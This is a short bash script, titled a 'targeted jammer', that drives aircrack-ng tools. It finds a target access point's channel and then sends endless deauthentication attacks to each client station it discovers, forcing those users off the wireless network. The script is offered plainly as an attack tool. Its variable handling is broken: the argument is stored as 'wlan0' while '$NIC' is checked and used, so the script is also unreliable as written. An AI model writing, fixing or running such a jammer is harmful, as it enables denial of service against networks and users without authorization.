#!/bin/bash
# Targeted jammer

wlan0=$1      # Your wireless NIC
BSSID=$2    # Your target BSSID

if [ "$NIC" == "" ]; then
    echo "No NIC defined."
    exit 1
fi

if [ "$BSSID" == "" ]; then
    echo "No BSSID defined."
    exit 1
fi

airmon-ng stop mon0     # Pull down any lingering monitor devices
airmon-ng start $NIC    # Start a monitor device
WIFI=mon0               # Default monitor card name after airmon-ng start

# get the channel from target BSSID
CHANNEL=`iwlist $NIC scan | grep "$BSSID" -A 1 | grep Channel | cut -d: -f 2`

rm *.csv 2> /dev/null
xterm -fn fixed -geom -0-0 -title "Scanning specified channel" -e "airodump-ng -c $CHANNEL -w airodumpoutput $WIFI" 2>/dev/null &
sleep 3

# Removes temp files that are no longer needed
rm *.cap 2>/dev/null
rm *.kismet.csv 2>/dev/null
rm *.netxml 2>/dev/null

mkdir stationlist 2>/dev/null
rm stationlist/*.txt 2>/dev/null

FILE="airodumpoutput*.csv"

while [ x1 ];do
    sleep 5s

    echo "Scanning for new stations..."
    LINES=`wc -l $FILE | cut -d' ' -f 1`
    STATIONS=`grep "Station MAC" $FILE -A $LINES --text | grep "$BSSID" | cut -d, -f 1`

    if [ "$STATIONS" != "" ]; then
        array=($STATIONS)
        for station in "${array[@]}"
        do
            if [ ! -e stationlist/"$station".txt ];then
                echo "Jamming station: $station"
                xterm -fn fixed -geom -0-0 -title "Jamming $station" -e "aireplay-ng --deauth 0 -a $BSSID -c $station $WIFI --ignore-negative-one" &
                touch "stationlist/$station.txt"
            fi
        done
    fi
done
